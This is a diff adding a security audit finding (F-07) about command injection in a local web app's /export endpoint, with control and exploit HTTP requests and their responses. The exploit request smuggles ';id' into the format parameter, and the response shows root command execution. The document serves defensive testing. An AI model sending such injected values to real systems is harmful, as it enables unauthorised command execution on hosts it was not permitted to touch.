@@ -1,0 +1,35 @@
+Finding: F-07 - Command injection in export
+Date: 2026-11-02T00:57:55.0172855+07:00
+Git commit: 11c3264638fe5e0549994810f81c5586f5524db2
+Target: GET http://localhost:8080/export
+
+Control request:
+URL: /export?fmt=txt
+Expected: exporting notes as txt only
+Observed:
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 34
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:56:59 GMT
+
+<pre>exporting notes as txt
+</pre>
+
+Exploit request:
+URL: /export?fmt=txt%3Bid
+Injected harmless command: id
+Expected secure result: reject the format or treat the value as data
+Observed:
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 73
+Server: Werkzeug/2.0.1 Python/3.12.16
+Date: Sun, 01 Nov 2026 17:57:06 GMT
+
+<pre>exporting notes as txt
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
+
+Result: CONFIRMED
+Safety note: No destructive commands or host-modifying commands were used.
